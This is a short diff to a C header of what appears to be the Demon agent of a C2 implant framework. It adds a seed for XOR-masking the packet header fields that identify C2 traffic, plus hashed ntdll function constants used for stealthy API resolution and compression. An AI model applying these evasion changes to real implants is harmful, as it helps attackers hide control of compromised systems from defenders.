@@ -14,6 +14,13 @@
 
 #define DEMON_MAGIC_VALUE 0xDEADBEEF
 
+/* [HVC-003 2026-03-26] Compile-time seed for the per-packet XOR mask that
+ * obfuscates the plaintext outer header fields (bytes 4-19: magic, agent ID,
+ * command ID, request ID) before wire transmission. The mask is derived as
+ * SIZE ^ HEADER_MASK_SEED so it varies per packet. Must match HeaderMaskSeed
+ * in teamserver/pkg/agent/commands.go. */
+#define HEADER_MASK_SEED  0xA3F1C2B4
+
 #define WIN_VERSION_UNKNOWN 0
 #define WIN_VERSION_XP      1
 #define WIN_VERSION_VISTA   2
@@ -98,13 +105,20 @@
 #define H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER     0xad1b018e
 #define H_FUNC_RTLCREATETIMERQUEUE                   0x50ef3c31
 #define H_FUNC_RTLDELETETIMERQUEUE                   0xeec188b0
+#define H_FUNC_RTLDELETETIMERQUEUEEX                 0xa5467ded
 #define H_FUNC_RTLCREATETIMER                        0x1877faec
 #define H_FUNC_RTLQUEUEWORKITEM                      0xae92028e
 #define H_FUNC_RTLREGISTERWAIT                       0x600fe691
+#define H_FUNC_RTLDEREGISTERWAITEX                   0x79d09e97
 #define H_FUNC_RTLCAPTURECONTEXT                     0xeba8d910
 #define H_FUNC_RTLCOPYMAPPEDMEMORY                   0x5b56b302
 #define H_FUNC_RTLFILLMEMORY                         0x89ab5f57
 #define H_FUNC_RTLEXITUSERTHREAD                     0x2f6db5e8
+
+/* [HVC-007 2026-03-28] LZNT1 compression (ntdll.dll). See TrafficImprovements.md §7. */
+#define H_FUNC_RTLGETCOMPRESSIONWORKSPACESIZE        0x3deb55f3
+#define H_FUNC_RTLCOMPRESSBUFFER                     0x417e60bd
+#define H_FUNC_RTLDECOMPRESSBUFFER                   0x17ab2746
 #define H_FUNC_RTLSUBAUTHORITYSID                    0x90ed208a
 #define H_FUNC_RTLSUBAUTHORITYCOUNTSID               0x4b23c9d3
 
